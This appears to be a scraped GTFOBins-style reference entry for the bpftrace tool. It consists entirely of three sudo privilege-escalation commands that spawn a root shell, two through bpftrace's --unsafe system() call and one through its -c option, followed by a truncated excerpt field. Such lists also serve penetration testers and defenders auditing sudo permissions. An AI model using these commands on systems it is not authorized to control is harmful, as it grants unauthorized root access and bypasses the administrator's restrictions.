title: bpftrace
html:
bpftrace

Shell

Context: sudo

bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'

Context: sudo

echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file

Context: sudo

bpftrace -c /bin/sh -e 'END {exit()}'
excerpt: bpftrace Shell Context: sudo bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}' Context: sudo echo 'BEGIN {system("/bin/sh 1<&0");exit()}&#x2
